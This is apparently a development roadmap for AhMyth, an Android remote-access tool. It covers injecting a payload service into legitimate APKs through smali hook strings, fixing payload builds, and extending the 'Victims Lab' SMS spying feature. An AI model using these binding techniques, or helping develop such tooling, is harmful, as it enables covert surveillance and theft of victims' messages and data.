## <div align="center"><ins>Stability Updates</ins></div>

- [x] 01: Figure out why AhMyth is so unstable on Windows machines!

- Done! Was due to outdated coding in the `main.js` file, as well as a bug in the Modification of a legit APK file's Launcher Activity when utilising the `On Launch` binding method, the framework directory for Apktool was also causing problems as well, so this has been fixed using a child process before building each APK Payload.
#
- [ ] 02: Merge Client & Server upgrades from [@HiddenPirates](https://github.com/HiddenPirates) and then integrate the Java code responisble for allowing the new hook function to work
#
- [x] 03: Replace the exported `orgAppKey` variable in the `Constants.js` file, with the new hook point variable...
```js
exports.hookPoint = 'return-void';
```
...then replace the exported `serviceSrc` variable in the `Constants.js` file, with the new static hook metbod...
```js
exports.serviceSrc = 'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService';
```
...then replace the exported `serviceStart` variable in the `Constants.js` file....
```js
exports.serviceStart = ';->start()V' +
'\n\n' +
'return-void';
```
....then replace the the old `onCreate` hook point code, with the new code for the new static hook function in **AppCtrl.js**

- Done!
#
- [x] 04: Figure out how to allow AhMyth to search `smali_classes` directories, 
if the launcher activity is not present anywhere in the `smali` directory.

- Done For Windows, Linux & macOS! A new cross platform `Bind On Launch` function has been implemented which fixes major bugs & previous limitations for Windows, macOS & Linux.
#
- [ ] 05. Stabilise the SMS feature by adding the ability to view sent SMS's in an `Outbox SMS` sub-tab next to a separate `Inbox SMS` sub-tab when using the Victims Lab's SMS feature, a small example of this can be seen below.
```
|--| SMS |
|----| Send an SMS |
|------| Inbox || Outbox |
```
#
- [ ] 06: Fix the binaries for 1.0-Beta.4 Release!
#
- [ ] 07: Implement the `REQUEST_IGNORE_BATTERY_OPTIMISATION` manifest permission in such a way where it wont be replaced when using the `Custom Permissions` feature.
